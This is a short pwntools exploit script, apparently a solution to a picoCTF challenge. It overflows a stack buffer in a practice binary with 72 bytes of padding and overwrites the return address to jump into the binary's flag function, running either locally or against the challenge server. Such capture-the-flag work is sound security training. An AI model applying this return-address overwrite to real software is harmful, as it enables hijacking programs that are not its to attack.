#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51157)

    return r


def main():
    r = conn()

    # Originally for stack alignment, but no longer needed since we skip the
    # `push ebp`` instuction in the flag function
    rop = ROP(exe)
    ret_gadget = rop.find_gadget(['ret'])[0]

    print(hex(ret_gadget))

    r.sendlineafter(b': \n', b'A'*72 + p64(exe.symbols.flag + 5))

    while True:
        print(r.recvuntil(b'}'))

    r.interactive()


if __name__ == "__main__":
    main()
